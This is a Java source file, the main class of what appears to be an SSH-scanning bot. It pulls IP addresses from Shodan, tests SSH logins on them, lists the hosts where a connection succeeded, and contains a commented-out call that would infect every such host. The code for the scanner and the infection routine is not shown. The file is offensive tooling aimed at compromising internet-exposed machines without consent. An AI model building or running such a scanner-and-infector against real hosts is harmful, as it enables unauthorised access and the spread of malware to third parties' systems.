package fr.spriggans.bot;

import java.util.List;

import fr.spriggans.bot.logger.Logger;
import fr.spriggans.bot.models.Results;
import fr.spriggans.bot.shodan.ShodanParser;
import fr.spriggans.bot.ssh.executor.InfectionExecutor;
import fr.spriggans.bot.ssh.scanner.SshTester;

public class Main {

	public static void main(String[] args) throws InterruptedException {
		Options.parseArgs(args);
		
		List<String> ipList = ShodanParser.getIps();
		Results results = SshTester.testIps(ipList);
		displayResults(results);
		
//		InfectionExecutor.infectAll(results);
		System.out.println("ALL Done");
	}
	
	private static void displayResults(Results results) {
		Logger.emptyLine();
		Logger.emptyLine();
		Logger.separationLine();
		Logger.log("Everything has been tested !");
		Logger.separationLine();
		if (results.getSuccessfullConnections().isEmpty()) {
			Logger.emptyLine();
			Logger.log("Sadly, no connections were successfull...");
		} else {
			Logger.emptyLine();
			Logger.log("The following connections worked :");
			results.getSuccessfullConnections().forEach(System.out::println);
		}
	}

}
